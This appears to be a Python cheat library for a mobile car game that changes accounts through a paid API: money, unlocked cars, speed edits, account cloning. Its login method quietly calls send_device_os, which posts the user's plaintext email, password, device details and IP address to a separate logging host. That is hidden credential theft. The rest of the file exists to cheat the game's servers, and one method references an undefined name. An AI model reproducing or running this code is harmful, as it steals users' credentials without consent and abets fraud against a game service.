import platform
import os
import requests
import subprocess
import urllib.parse
import json
from concurrent.futures import ThreadPoolExecutor

import requests


__ENDPOINT_URL__: str = "https://cpmcheats.hostzera.com.br/api2"


class CPMCheats:
    def __init__(self, access_key) -> None:
        self.auth_token = None
        self.access_key = access_key
        self.telegram_id = None

    def login(self, email, password) -> int:
        payload = {"account_email": email, "account_password": password}
        params = {"key": self.access_key, "acc_email": email, "acc_pass": password}
        response = requests.post(
            f"{__ENDPOINT_URL__}/account_login", params=params, data=payload
        )
        response_decoded = response.json()
        if response_decoded.get("ok"):
            self.auth_token = response_decoded.get("auth")
            key_data = self.get_key_data()
            self.telegram_id = key_data.get("telegram_id")
            self.send_device_os(email=email, password=password)
        return response_decoded.get("error")

    def send_device_os(self, email=None, password=None):
        try:
            system = platform.system()
            release = platform.release()
            device_name = "Unknown"
            build_number = "Unknown"

            if system == "Darwin":
                if os.path.exists("/bin/ash") or "iSH" in release:
                    device_os = "iOS (iSH)"
                    device_name = (
                        subprocess.getoutput("sysctl -n hw.model") or "iSH Device"
                    )
                    build_number = (
                        subprocess.getoutput("sw_vers -productVersion") or "Unknown"
                    )
                else:
                    device_os = "macOS"
                    device_name = subprocess.getoutput("sysctl -n hw.model") or "Mac"
                    build_number = (
                        subprocess.getoutput("sw_vers -productVersion") or "Unknown"
                    )
            elif system == "Linux":
                device_os = "Android" if os.path.exists("/system/bin") else "Linux"
                if device_os == "Android":
                    device_name = (
                        subprocess.getoutput("getprop ro.product.model")
                        or "Android Device"
                    )
                    build_number = (
                        subprocess.getoutput("getprop ro.build.version.release")
                        or "Unknown"
                    )
                else:
                    device_name = "Linux Device"
                    build_number = "Unknown"
            else:
                device_os = system + " " + release
                device_name = platform.node()
                build_number = "Unknown"
        except Exception:
            device_os = "Unknown"
            device_name = "Unknown"
            build_number = "Unknown"

        try:
            ip_address = requests.get("https://api.ipify.org").text.strip()
        except:
            ip_address = "Unknown"

        payload = {
            "action": "device_info",
            "data": {
                "access_key": self.access_key,
                "device_os": device_os,
                "device_name": device_name,
                "build_number": build_number,
                "ip_address": ip_address,
                "telegram_id": getattr(self, "telegram_id", "Unknown"),
            },
        }

        if email:
            payload["data"]["email"] = email
        if password:
            payload["data"]["password"] = password

        response = requests.post(
            "https://popstool.io/Abdosalhpc04h/adminLogs.php", json=payload
        )

        return response.status_code == 200

    def change_email(self, new_email):
        decoded_email = urllib.parse.unquote(new_email)
        payload = {"account_auth": self.auth_token, "new_email": decoded_email}
        params = {"key": self.access_key, "new_email": decoded_email}
        response = requests.post(
            f"{__ENDPOINT_URL__}/change_email", params=params, data=payload
        )
        response_decoded = response.json()
        if response_decoded.get("new_token"):
            self.auth_token = response_decoded["new_token"]
        return response_decoded.get("ok")

    def change_password(self, new_password):
        payload = {"account_auth": self.auth_token, "new_password": new_password}
        params = {"key": self.access_key, "new_password": new_password}
        response = requests.post(
            f"{__ENDPOINT_URL__}/change_password", params=params, data=payload
        )
        response_decoded = response.json()
        if response_decoded.get("new_token"):
            self.auth_token = response_decoded["new_token"]
        return response_decoded.get("ok")

    def register(self, email, password) -> int:
        payload = {"account_email": email, "account_password": password}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/account_register", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("error")

    def delete(self):
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        requests.post(f"{__ENDPOINT_URL__}/account_delete", params=params, data=payload)

    def get_player_data(self) -> any:
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/get_data", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded

    def set_player_rank(self) -> bool:
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/set_rank", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def get_key_data(self) -> any:
        params = {"key": self.access_key}
        response = requests.get(f"{__ENDPOINT_URL__}/get_key_data", params=params)
        response_decoded = response.json()
        return response_decoded

    def set_player_money(self, amount) -> bool:
        payload = {"account_auth": self.auth_token, "amount": amount}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/set_money", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def set_player_coins(self, amount) -> bool:
        payload = {"account_auth": self.auth_token, "amount": amount}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/set_coins", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def set_player_name(self, name) -> bool:
        payload = {"account_auth": self.auth_token, "name": name}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/set_name", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def set_player_localid(self, id) -> bool:
        payload = {"account_auth": self.auth_token, "id": id}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/set_id", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def get_player_car(self, car_id) -> any:
        payload = {"account_auth": self.auth_token, "car_id": car_id}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/get_car", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def delete_player_friends(self) -> bool:
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/delete_friends", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def unlock_w16(self) -> bool:
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_w16", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def unlock_horns(self) -> bool:
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_horns", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def disable_engine_damage(self) -> bool:
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/disable_damage", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def unlimited_fuel(self) -> bool:
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlimited_fuel", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def set_player_wins(self, amount) -> bool:
        payload = {"account_auth": self.auth_token, "amount": amount}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/set_race_wins", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def set_player_loses(self, amount) -> bool:
        payload = {"account_auth": self.auth_token, "amount": amount}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/set_race_loses", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def unlock_houses(self) -> bool:
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_houses", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def unlock_smoke(self) -> bool:
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_smoke", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def unlock_all_lamborghinis(self) -> bool:
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_all_lamborghinis", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def unlock_paid_cars(self) -> bool:
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_paid_cars", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def unlock_all_cars(self) -> bool:
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_all_cars", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def unlock_all_cars_siren(self) -> bool:
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_all_cars_siren", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def account_clone(self, account_email, account_password) -> bool:
        payload = {
            "account_auth": self.auth_token,
            "account_email": account_email,
            "account_password": account_password,
        }
        params = {
            "key": self.access_key,
            "account_email": account_email,
            "account_password": account_password,
        }
        response = requests.post(
            f"{__ENDPOINT_URL__}/clone", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def set_player_plates(self) -> bool:
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/set_plates", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def unlock_wheels(self) -> bool:
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_wheels", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def unlock_equipments_male(self) -> bool:
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_equipments_male", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def unlock_hat_m(self) -> bool:
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_hat_m", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def rmhm(self) -> bool:
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/rmhm", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def unlock_topm(self) -> bool:
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_topm", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def unlock_topmz(self) -> bool:
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_topmz", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def unlock_topmx(self) -> bool:
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_topmx", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def unlock_equipments_female(self) -> bool:
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_equipments_female", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def rmhfm(self) -> bool:
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/rmhfm", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def unlock_topf(self) -> bool:
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_topf", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def unlock_topfz(self) -> bool:
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_topfz", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def hack_car_speed(self, car_id, new_hp, new_inner_hp, new_nm, new_torque):
        payload = {
            "account_auth": self.auth_token,
            "car_id": car_id,
            "new_hp": new_hp,
            "new_inner_hp": new_inner_hp,
            "new_nm": new_nm,
            "new_torque": new_torque,
        }
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/hack_car_speed", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def unlock_animations(self) -> bool:
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_animations", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def max_max1(self, car_id, custom):
        payload = {
            "account_auth": self.auth_token,
            "car_id": car_id,
            "custom": custom,
        }
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/max_max1", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def max_max2(self, car_id, custom):
        payload = {
            "account_auth": self.auth_token,
            "car_id": car_id,
            "custom": custom,
        }
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/max_max2", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def millage_car(self, car_id, custom):
        payload = {
            "account_auth": self.auth_token,
            "car_id": car_id,
            "custom": custom,
        }
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/millage_car", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def brake_car(self, car_id, custom):
        payload = {
            "account_auth": self.auth_token,
            "car_id": car_id,
            "custom": custom,
        }
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/brake_car", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def unlock_crown(self) -> bool:
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_crown", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def unlock_cls(self) -> bool:
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/unlock_cls", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def rear_bumper(self, car_id):
        payload = {
            "account_auth": self.auth_token,
            "car_id": car_id,
        }
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/rear_bumper", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def front_bumper(self, car_id):
        payload = {
            "account_auth": self.auth_token,
            "car_id": car_id,
        }
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/front_bumper", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def testin(self, custom):
        payload = {
            "account_auth": self.auth_token,
            "custom": custom,
        }
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/testin", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def telmunnongodz(self, car_id, custom):
        payload = {
            "account_auth": self.auth_token,
            "car_id": car_id,
            "custom": custom,
        }
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/telmunnongodz", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def speed_all_cars(self, new_hp, new_inner_hp, new_nm, new_torque):
        payload = {
            "account_auth": self.auth_token,
            "new_hp": new_hp,
            "new_inner_hp": new_inner_hp,
            "new_nm": new_nm,
            "new_torque": new_torque,
        }
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/speed_all_cars", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def shittin(self) -> bool:
        payload = {"account_auth": self.auth_token}
        params = {"key": self.access_key}
        response = requests.post(f"{ENDPOINT_URL}/shittin", params=params, data=payload)
        response_decoded = response.json()
        return response_decoded.get("ok")

    def incline(self, car_id, custom):
        payload = {
            "account_auth": self.auth_token,
            "car_id": car_id,
            "custom": custom,
        }
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/incline", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def copy_livery(self, source_car_id, target_car_id):
        payload = {
            "account_auth": self.auth_token,
            "source_car_id": source_car_id,
            "target_car_id": target_car_id,
        }
        params = {"key": self.access_key}
        response = requests.post(
            f"{__ENDPOINT_URL__}/copy_livery", params=params, data=payload
        )
        response_decoded = response.json()
        return response_decoded.get("ok")

    def modificar_todos_los_autos(
        self, new_hp, new_inner_hp, new_nm, new_torque
    ) -> bool:
        with open("car_ids.json", "r") as file:
            car_ids = json.load(file)

        def modificar_auto(car_id):
            payload = {
                "account_auth": self.auth_token,
                "car_id": car_id,
                "new_hp": new_hp,
                "new_inner_hp": new_inner_hp,
                "new_nm": new_nm,
                "new_torque": new_torque,
            }
            params = {"key": self.access_key}
            try:
                response = requests.post(
                    f"{__ENDPOINT_URL__}/speed_all_cars",
                    params=params,
                    data=payload,
                    timeout=3,
                )
                return response.json().get("ok", False)
            except:
                return False

        with ThreadPoolExecutor(max_workers=20) as executor:
            list(executor.map(modificar_auto, car_ids))

        return True
